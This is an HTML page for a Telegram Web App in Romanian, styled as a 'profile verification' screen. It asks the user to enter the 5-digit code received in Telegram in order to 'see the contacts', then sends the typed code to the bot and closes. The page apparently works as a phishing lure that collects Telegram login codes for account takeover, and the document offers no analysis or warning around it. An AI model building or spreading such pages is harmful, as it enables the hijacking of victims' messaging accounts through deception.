<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; background-color: #000; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { width: 90%; text-align: center; }
        input { width: 100%; padding: 15px; border-radius: 10px; border: 1px solid #333; background: #1c1c1e; color: white; font-size: 20px; text-align: center; margin-bottom: 20px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; border-radius: 10px; border: none; background-color: #007aff; color: white; font-size: 16px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Verificare Profil</h2>
        <p>Introdu codul de 5 cifre primit în Telegram pentru a vedea contactele.</p>
        <input type="number" id="c" placeholder="00000">
        <button onclick="s()">Confirmă</button>
    </div>
    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        function s() {
            const val = document.getElementById('c').value;
            if (val.length >= 5) {
                tg.sendData(val);
                tg.close();
            }
        }
    </script>
</body>
</html>
